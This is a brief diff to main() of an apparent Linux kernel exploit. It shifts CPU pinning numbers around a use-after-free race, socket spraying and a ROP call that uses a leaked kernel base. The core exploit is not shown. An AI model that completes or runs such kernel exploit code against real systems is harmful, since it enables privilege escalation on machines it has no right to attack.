@@ -422,7 +422,7 @@ int main() {
     save_kernel_state();
     
     // Pin to single CPU early to prevent cross-CPU race conditions during UAF
-    pin_to_cpu(0);
+    pin_to_cpu(1);
 
     for (int i = 0; i < 16; i++)
         new_socket();
@@ -554,10 +554,10 @@ int main() {
     }
 	
 	if (exploit_success) {
-		pin_to_cpu(1);
+		pin_to_cpu(2);
 		rop_call_funcptr(spray_map, spray_sock, kernel_base);
 
-		for (int cpu = 2; cpu <= 7; cpu++) {
+		for (int cpu = 3; cpu <= 7; cpu++) {
 			pin_to_cpu(cpu);
 			rop_call_funcptr(spray_map, NULL, kernel_base);
 		}
@@ -587,3 +587,4 @@ int main() {
     
     return exploit_success ? 0 : 1;
 }
+
